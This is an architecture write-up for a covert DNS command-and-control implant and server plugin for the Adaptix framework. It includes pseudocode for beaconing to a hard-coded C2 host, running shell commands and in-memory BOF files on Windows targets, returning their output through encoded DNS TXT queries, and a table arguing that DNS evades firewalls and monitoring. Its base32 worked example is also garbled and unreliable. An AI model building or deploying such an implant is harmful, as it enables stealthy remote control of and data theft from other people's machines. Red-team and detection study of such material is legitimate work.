# DNS C2 Architecture

## The Three Components

```
┌─────────────────────────────────────────────────────┐
│ Windows Target (dns_agent.exe)                      │
│                                                      │
│ 1. Register: send hostname/pid/user/arch            │
│ 2. Beacon:   poll for tasks every SLEEP_MS          │
│ 3. Execute:  run shell commands or BOF              │
│ 4. Report:   return output in next heartbeat        │
└──────────┬──────────────────────────────────────────┘
           │
           │  Raw UDP DNS TXT query
           │  base32(XOR(frame))
           │  QName: <chunks>.<agentid>.<domain>
           ▼
┌──────────────────────────────────────────────────────┐
│ Kali 192.168.67.128:5300 (BeaconDNS.so)             │
│                                                      │
│ miekg/dns — UDP + TCP listener                      │
│ • Parse TXT qname                                   │
│ • base32 decode + XOR decrypt                       │
│ • Route by message type                             │
│ • Call Teamserver APIs                              │
│ • Encode response in TXT record                     │
└──────────┬──────────────────────────────────────────┘
           │
           │  Ts.TsAgentCreate(watermark, agentid, payload, listener, ip, async)
           │  or
           │  Ts.TsAgentProcessData(agentid, decoded_data)
           ▼
┌──────────────────────────────────────────────────────┐
│ Adaptix DNS Agent Plugin (dns_agent.so)             │
│                                                      │
│ • Parse registration payload                        │
│ • CreateAgent(payload) → AgentData                  │
│ • ProcessData() → handle output + BOF results       │
│ • CreateCommand() → encode tasks                    │
│ • PackTasks() → serialize to wire format            │
└──────────────────────────────────────────────────────┘
         │
         │  → Agent appears in Sessions tab
         │  → Operator tasks agent
         │  → Tasks sent in next heartbeat
```

## Registration Flow

### 1. Implant Constructs Registration Frame

```c
// payload/src/main.c
frame = {
  msg_type: 0x01 (REGISTER),
  seq: 0,
  data_len: sizeof(registration_data),
  data: {
    hostname_len, hostname,
    username_len, username,
    pid, arch, os_major, os_minor,
    sleep_ms, jitter_pct
  }
}
```

### 2. Implant Encrypts & Encodes

```c
// payload/src/protocol.c
xor_key = derive_key(AGENT_ID)  // "deadc0de" → [0xde, 0xad, 0xc0, 0xde]
encrypted = frame XOR xor_key (repeating)
encoded = base32(encrypted)

// Split into DNS labels (max 63 chars each)
qname = chunk1.chunk2.chunk3.agentid.domain
      = MFRA.ABCD.EFGH.deadc0de.c2.lab
```

### 3. Implant Sends Raw UDP DNS TXT Query

```c
// payload/src/dns.c
sock = socket(AF_INET, SOCK_DGRAM, 0)
server.sin_addr = C2_HOST (192.168.67.128)
server.sin_port = htons(C2_PORT) (5300)

// Construct DNS packet in wire format (not using OS resolver)
dns_pkt = [DNS header][Question section with qname][Answer section empty]
          query_name: MFRA.ABCD.EFGH.deadc0de.c2.lab
          query_type: TXT (0x0010)
          query_class: IN (0x0001)

sendto(sock, dns_pkt, pkt_len, 0, &server, sizeof(server))
```

### 4. Listener Receives & Decodes

```go
// listener/dns_server.go - miekg/dns handler
func handleTXT(w dns.ResponseWriter, r *dns.Msg) {
  // Question: MFRA.ABCD.EFGH.deadc0de.c2.lab TXT IN
  
  qname := r.Question[0].Name  // "mfra.abcd.efgh.deadc0de.c2.lab."
  labels := strings.Split(qname, ".")
  
  // Extract: agentid = "deadc0de"
  // Concatenate chunks: data_labels = "MFRA" + "ABCD" + "EFGH"
  
  // Decode: base32_decode(data_labels) → encrypted
  // Decrypt: encrypted XOR xor_key → frame
  
  // Parse frame: msg_type = 0x01 (REGISTER)
  payload := frame.data
  
  // Call Adaptix: 
  agentData, err := Ts.TsAgentCreate("d0c00001", "deadc0de", payload, "DNSC2", remoteIP, false)
}
```

### 5. Agent Handler Parses Registration

```go
// agent/pl_main.go
func CreateAgent(beat []byte) (adaptix.AgentData, error) {
  // Parse registration payload
  // [1] hostname_len, [N] hostname
  // [1] username_len, [N] username
  // [4] pid, [1] arch, [1] os_major, [1] os_minor
  // [4] sleep_ms, [1] jitter_pct
  
  return adaptix.AgentData{
    Hostname: parsed_hostname,
    User: parsed_username,
    PID: parsed_pid,
    Architecture: parsed_arch,
    OSVersion: fmt.Sprintf("%d.%d", os_major, os_minor),
    Sleep: sleep_ms,
    Jitter: jitter_pct,
  }, nil
}
```

### 6. Listener Sends ACK

```go
// listener/dns_server.go
response_frame := {
  resp_type: 0x01 (REG_ACK),
  data_len: 0
}

encrypted := response_frame XOR xor_key
encoded := base32(encrypted)

// Send as DNS TXT record
answer := &dns.TXT{
  Hdr: dns.RR_Header{Name: qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 300},
  Txt: []string{encoded},  // "WXYZ..." (base32)
}

w.WriteMsg(&dns.Msg{Answer: []dns.RR{answer}})
```

### 7. Implant Receives ACK & Enters Beacon Loop

```c
// payload/src/main.c - beacon_loop()
while (1) {
  // Build heartbeat frame
  frame = {msg_type: 0x02, seq: seq++, data_len: 0}
  encrypted = frame XOR xor_key
  encoded = base32(encrypted)
  qname = chunk.agentid.domain
  
  // Send query
  sendto(sock, dns_pkt, ...)
  
  // Receive response (DNS TXT record)
  recvfrom(sock, response_buf, ...)
  
  // Decode TXT value
  base32_decode(txt_value) → encrypted
  frame = encrypted XOR xor_key
  
  // Parse response
  if frame.resp_type == 0x02 (TASKS) {
    tasks = parse_tasks(frame.data)
    dispatch_tasks(tasks)  // Execute shell/BOF
  }
  
  // Sleep + jitter
  sleep(SLEEP_MS + rand() % (SLEEP_MS * JITTER_PCT / 100))
}
```

---

## Tasking Flow

### 1. Operator Tasks Agent

```
Adaptix GUI:
  Sessions → [deadc0de] → Interact
  > shell whoami
```

### 2. Server Builds Task

```go
// agent/commands.go
func CreateCommand(agentData, args) (TaskData, error) {
  // args = {"cmd": "whoami"}
  
  task := adaptix.TaskData{
    CommandID: "shell",
    Args: json.Marshal(args),
    // ... other fields
  }
  return task, nil
}
```

### 3. Server Packs Tasks for Response

```go
// agent/pl_main.go
func PackTasks(agentData, tasks []TaskData) ([]byte, error) {
  // Serialize task list
  response_frame := {
    resp_type: 0x02 (TASKS),
    data_len: len(task_buffer),
    data: [serialized tasks]
  }
  
  // Return for listener to encode
  return frame_bytes, nil
}
```

### 4. Listener Encodes & Sends in Next Heartbeat

```go
// listener/dns_server.go - on next heartbeat query
response := {
  resp_type: 0x02,
  data_len: task_buffer_size,
  data: task_buffer
}

encrypted := response XOR xor_key
encoded := base32(encrypted)

// Send as TXT record value
ans.Txt = []string{encoded}
w.WriteMsg(response_msg)
```

### 5. Implant Receives & Executes

```c
// payload/src/main.c
frame = recv_dns_response()
tasks = parse_tasks(frame.data)

// dispatch_tasks()
for each task {
  if (task.cmd == "shell") {
    result = execute_shell(task.args["cmd"])  // "whoami"
    // CreateProcess("cmd.exe /c whoami") + pipe capture
    queue_output(result)
  } else if (task.cmd == "execute-bof") {
    result = load_and_run_bof(task.file, task.args)
    queue_output(result)
  }
}
```

### 6. Implant Sends Output in Next Heartbeat

```c
// payload/src/main.c - beacon_loop()
// Build output frame
output_frame := {
  msg_type: 0x03 (OUTPUT),
  seq: seq++,
  data_len: strlen(output),
  data: output_buffer  // "ADMIN\TARGETHOST"
}

encrypted = output_frame XOR xor_key
qname = chunk.agentid.domain  // Same encoding as heartbeat

sendto(sock, dns_pkt, ...)
```

### 7. Listener Decodes & Logs Output

```go
// listener/dns_server.go
frame = decode_dns_query(qname)

if frame.msg_type == 0x03 (OUTPUT) {
  // Store in outputBuf for reassembly if chunked
  outputBuf[agentid + "_" + seq] = frame.data
  
  // If all chunks present, call:
  Ts.TsAgentProcessData(agentid, reassembled_output)
}
```

### 8. Agent Handler Logs to Console

```go
// agent/commands.go
func ProcessData(agentData, decryptedData []byte) error {
  // Parse decrypted data
  msg_type := decryptedData[0]
  
  if msg_type == 0x03 (OUTPUT) {
    output := decryptedData[4:]  // Skip header
    
    // Log to Adaptix console
    Ts.TsAgentConsoleOutput(agentData.ID, MSG_OUTPUT, string(output), "", true)
  }
  
  return nil
}
```

### 9. Output Appears in GUI Console

```
> shell whoami
[AGENT OUTPUT]
ADMIN\TARGETHOST
```

---

## Multi-Chunk Reassembly

For large outputs (e.g., verbose process listing), DNS response size limits require chunking:

```
┌─ Implant Chunk 1 (seq=1)
│  msg_type=0x03, seq=1, data_len=1000, data=[first 1000 bytes]
│  Sent as DNS TXT query
│
├─ Listener receives chunk 1
│  Stores in outputBuf["agentid_1"] = data1
│  data1 + data2 + ... not yet complete
│
┌─ Implant Chunk 2 (seq=2)
│  msg_type=0x03, seq=2, data_len=1000, data=[next 1000 bytes]
│
├─ Listener receives chunk 2
│  Stores in outputBuf["agentid_2"] = data2
│  Checks: have chunks 1, 2, but is 3 expected?
│  If final chunk received, call TsAgentProcessData() with reassembled output
│
└─ Output reconstructed in console
```

Sequence number in frame header tracks chunks. Listener waits for all chunks, then reassembles and logs once.

---

## Protocol Encoding

### XOR Encryption

Agent ID bytes become XOR key (repeating):

```
AGENT_ID = "deadc0de"
Hex pairs: de, ad, c0, de

XOR_KEY bytes = [0xde, 0xad, 0xc0, 0xde]

plaintext = [0x01, 0x02, 0x03, 0x04, 0x05, ...]
repeating = [0xde, 0xad, 0xc0, 0xde, 0xde, ...]
ciphertext = [0xdf, 0xaf, 0xc3, 0xda, 0xdb, ...]  (XOR)
```

### Base32 Encoding

RFC 4648 base32 alphabet (no padding):

```
plaintext bytes → 5-bit groups → base32([A-Z2-7])

Example:
0xde, 0xad, 0xc0 (24 bits)
→ 11011110 10101101 11000000
→ 11011 11010 10110 111 00000 (pad to 8)
→ [27][26][22][28][0] (base32 indices)
→ "BWTVA" (base32 alphabet)
```

Safe for DNS labels (no dots, slashes, or special chars).

### DNS Frame Format

**Wire Format (transmitted):**

```
[1 byte]   msg_type
[1 byte]   seq
[2 bytes]  data_len (LE uint16, little-endian)
[N bytes]  data
```

**Message Types:**

- `0x01` — REGISTER (registration payload)
- `0x02` — HEARTBEAT (empty, used for polling)
- `0x03` — OUTPUT (command output or error)
- `0x04` — BOF_OUTPUT (structured BOF stream)

**Response Types:**

- `0x00` — IDLE (no tasks)
- `0x01` — REG_ACK (registration confirmed)
- `0x02` — TASKS (task list)
- `0x03` — CONTINUE (continuation, for chunked responses)

---

## BOF (Beacon Object File) Execution

### 1. Operator Tasks BOF

```
> execute-bof creds.o hostname admin password
```

### 2. Server Encodes BOF File + Args

```go
// agent/commands.go
task := {
  CommandID: "execute-bof",
  Args: {
    "file": <binary .o file data>,
    "args": "hostname admin password"
  }
}
```

### 3. Implant Loads & Executes

```c
// payload/src/bof_loader.c
void *bof_memory = malloc(bof_file_size)
memcpy(bof_memory, bof_file_data, bof_file_size)

// Relocate COFF image
relocate_coff(bof_memory)

// Resolve symbols → fill in BeaconAPI stubs
resolve_imports(bof_memory, beacon_api_exports)

// Call BOF entry point
typedef int (*BOF_ENTRY)(void *args, int argsize)
BOF_ENTRY func = (BOF_ENTRY)bof_memory
output = func(arg_buffer, arg_size)

// Capture printf() output via beacon_api.c stubs
// Send as msg_type=0x04 (BOF_OUTPUT)
```

### 4. BeaconAPI Stubs

```c
// payload/src/beacon_api.c
int BeaconPrintf(int level, char *fmt, ...) {
  // Called by BOF, captured as output
  va_list args
  vsnprintf(buffer, sizeof(buffer), fmt, args)
  queue_output(buffer)  // Will be sent in next heartbeat
  return 0
}

void *BeaconMalloc(size_t size) {
  return malloc(size)
}

void BeaconFree(void *ptr) {
  free(ptr)
}

// ... more API shims
```

### 5. Output Sent & Logged

```c
// Next heartbeat
output_frame := {
  msg_type: 0x04 (BOF_OUTPUT),
  seq: seq++,
  data: output_from_bof
}

// Listener routes to agent's ProcessData()
// Agent logs with [BOF] prefix in console
```

---

## Why DNS?

| Aspect | Advantage |
|--------|-----------|
| **Stealth** | TXT queries blend into normal traffic; often whitelisted by firewalls |
| **Resilience** | No persistent connection; queries naturally retry on failure |
| **Simplicity** | DNS is fundamental; no extra software/libraries needed on target |
| **Bypass** | Often allowed even when HTTP/HTTPS blocked |
| **Covertness** | TXT records less monitored than HTTP headers or certificates |

**Tradeoff:** Lower bandwidth, higher latency vs. HTTP C2. But superior stealth.

---

## Configuration Files

### listener/config.yaml

```yaml
extender_type: "listener"
extender_file: "BeaconDNS.so"
ax_file: "ax_config.axs"
listener_name: "DNSC2"
listener_type: "external"
protocol: "DNS"
```

### agent/config.yaml

```yaml
extender_type: "agent"
extender_file: "dns_agent.so"
ax_file: "ax_config.axs"
agent_name: "dns_agent"
agent_watermark: "d0c00001"  # Must be exactly 8 lowercase hex
listeners:
  - "DNSC2"
multi_listeners: false
```

### payload/include/config.h

```c
#define C2_HOST    "192.168.67.128"
#define C2_PORT    5300
#define C2_DOMAIN  "c2.lab"
#define AGENT_ID   "deadc0de"
#define SLEEP_MS   5000
#define JITTER_PCT 20
```

---

## Summary

```
Implant (C)
  ↓ Raw UDP DNS TXT query
  ├ XOR encrypt (key from AGENT_ID)
  ├ Base32 encode
  ├ DNS qname: chunks.agentid.domain
  ↓
Listener (Go)
  ↓ Miekg/dns server receives
  ├ Decode qname
  ├ Base32 decode
  ├ XOR decrypt
  ├ Parse message type
  ↓
Agent (Go)
  ├ CreateAgent() for registration
  ├ ProcessData() for output
  ├ CreateCommand() for tasking
  ↓
Response (via DNS TXT record)
  ├ Encode tasks
  ├ Base32 + XOR
  ├ Send in response packet
  ↓
Implant receives
  ├ Decode response
  ├ Parse tasks
  ├ Execute (shell/BOF)
  ├ Queue output
  ├ Send in next heartbeat
  ↓ (repeat)
```

All communication over DNS TXT queries + responses. Stealth by design.
